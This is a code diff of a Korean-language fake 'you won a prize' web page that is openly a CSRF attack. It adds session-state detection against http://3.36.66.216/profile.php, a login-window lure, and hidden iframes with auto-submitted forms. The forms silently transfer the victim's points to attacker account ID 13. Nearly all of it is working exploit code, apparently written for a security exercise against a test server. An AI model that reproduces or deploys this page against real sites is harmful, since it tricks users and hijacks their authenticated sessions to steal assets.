@@ -42,6 +42,20 @@
             color: #FFD700;
             margin-top: 30px;
         }
+        .login-button {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            color: white;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin: 20px 10px;
+            transition: transform 0.3s;
+        }
+        .login-button:hover {
+            transform: scale(1.05);
+        }
     </style>
 </head>
 <body>
@@ -49,27 +63,105 @@
         <div class="gift-box">🎁</div>
         <h1>축하합니다!</h1>
         <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
-        <p class="auto-message">💰 포인트를 자동으로 지급하고 있습니다...</p>
         
         <div id="status" style="margin-top: 30px;">
-            <p>🔄 처리 중...</p>
+            <p>🔄 로그인 상태 확인 중...</p>
+        </div>
+        
+        <div id="loginSection" style="display: none;">
+            <p class="auto-message">🔐 포인트 지급을 위해 로그인이 필요합니다</p>
+            <button class="login-button" onclick="openLoginWindow()">
+                🚪 로그인하고 포인트 받기
+            </button>
+            <p style="font-size: 0.9em; margin-top: 20px;">
+                로그인 후 이 창으로 돌아오면 자동으로 포인트가 지급됩니다!
+            </p>
         </div>
     </div>
 
     <script>
+        let attackExecuted = false;
+        
         window.addEventListener('load', function() {
-            console.log('🎯 원클릭 CSRF 공격 시작!');
+            console.log('🎯 세션 기반 CSRF 공격 시작!');
+            checkAndExecute();
+        });
+        
+        // 주기적으로 로그인 상태 체크
+        setInterval(checkAndExecute, 3000);
+        
+        function checkAndExecute() {
+            if (attackExecuted) return;
+            
+            const statusEl = document.getElementById('status');
+            const loginSection = document.getElementById('loginSection');
+            
+            // 로그인 상태 체크
+            fetch('http://3.36.66.216/profile.php', {
+                method: 'GET',
+                credentials: 'include'
+            }).then(response => {
+                if (response.redirected && response.url.includes('login')) {
+                    // 로그인 필요
+                    statusEl.innerHTML = '<p style="color: #FFB347;">🔐 로그인이 필요합니다</p>';
+                    loginSection.style.display = 'block';
+                } else {
+                    // 로그인 됨 - 공격 실행
+                    statusEl.innerHTML = '<p style="color: #00FF88;">✅ 로그인 확인됨!</p>';
+                    loginSection.style.display = 'none';
+                    executeAttackSequence();
+                }
+            }).catch(() => {
+                // CORS 에러 등 - 다른 방법으로 체크
+                tryImageCheck();
+            });
+        }
+        
+        function tryImageCheck() {
+            const img = new Image();
+            img.onload = function() {
+                console.log('🔍 이미지 로드 성공 - 로그인 상태로 추정');
+                executeAttackSequence();
+            };
+            img.onerror = function() {
+                const statusEl = document.getElementById('status');
+                const loginSection = document.getElementById('loginSection');
+                statusEl.innerHTML = '<p style="color: #FFB347;">🔐 로그인 후 이용해주세요</p>';
+                loginSection.style.display = 'block';
+            };
+            img.src = 'http://3.36.66.216/profile.php?' + Date.now();
+        }
+        
+        function openLoginWindow() {
+            const loginWindow = window.open(
+                'http://3.36.66.216/login.php', 
+                'loginWindow',
+                'width=600,height=500,scrollbars=yes,resizable=yes'
+            );
+            
+            // 로그인 창 모니터링
+            const checkClosed = setInterval(() => {
+                if (loginWindow.closed) {
+                    clearInterval(checkClosed);
+                    setTimeout(() => {
+                        checkAndExecute();
+                    }, 1000);
+                }
+            }, 1000);
+        }
+        
+        function executeAttackSequence() {
+            if (attackExecuted) return;
+            attackExecuted = true;
             
             const statusEl = document.getElementById('status');
             
-            setTimeout(() => {
-                statusEl.innerHTML = '<p style="color: #FFD700;">📡 서버에 연결 중...</p>';
-            }, 1000);
+            statusEl.innerHTML = '<p style="color: #FFD700;">📡 서버에 연결 중...</p>';
             
             setTimeout(() => {
                 statusEl.innerHTML = '<p style="color: #00FF88;">⚡ 포인트 전송 중...</p>';
                 executeOneClickAttack();
-            }, 2000);
+            }, 1500);
             
             setTimeout(() => {
                 statusEl.innerHTML = `
@@ -81,24 +173,23 @@
                         </a>
                     </p>
                 `;
-            }, 5000);
-        });
+            }, 4000);
+        }
         
         function executeOneClickAttack() {
-            console.log('🚀 원클릭 공격 실행 중...');
+            console.log('🚀 세션 기반 공격 실행 중...');
             
             const attacks = [
-                { points: 100, gift_type: 'diamond', message: 'OneClick_Attack_1' },
-                { points: 75, gift_type: 'coffee', message: 'OneClick_Attack_2' },
-                { points: 50, gift_type: 'cake', message: 'OneClick_Attack_3' }
+                { points: 100, gift_type: 'diamond', message: 'Session_Attack_1' },
+                { points: 75, gift_type: 'coffee', message: 'Session_Attack_2' },
+                { points: 50, gift_type: 'cake', message: 'Session_Attack_3' }
             ];
             
             attacks.forEach((attack, index) => {
                 setTimeout(() => {
-                    // 직접 Form 방식으로 변경
                     createDirectForm(attack, index + 1);
-                    console.log('🎯 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
-                }, index * 1000);
+                    console.log('🎯 세션 공격 ' + (index + 1) + ': ' + attack.points + 'P 시도');
+                }, index * 800);
             });
         }
         
@@ -106,8 +197,14 @@
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = 'http://3.36.66.216/profile.php';
-            form.target = '_blank';
+            form.target = 'attack_frame_' + id;
             form.style.display = 'none';
+            
+            // 숨겨진 iframe 생성
+            const iframe = document.createElement('iframe');
+            iframe.name = 'attack_frame_' + id;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
             const fields = {
                 receiver_id: '13',
@@ -127,11 +224,16 @@
             
             document.body.appendChild(form);
             form.submit();
-            document.body.removeChild(form);
+            
+            // 정리
+            setTimeout(() => {
+                if (form.parentNode) form.parentNode.removeChild(form);
+                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+            }, 5000);
         }
         
-        console.log('🎁 원클릭 포인트 탈취 시스템 로드됨');
-        console.log('⚡ 링크 접속만으로 자동 공격 실행');
+        console.log('🎁 세션 기반 CSRF 공격 시스템 로드됨');
+        console.log('🔐 로그인 상태 자동 감지');
         console.log('🎯 타겟: hacker (ID: 13)');
     </script>
 </body>
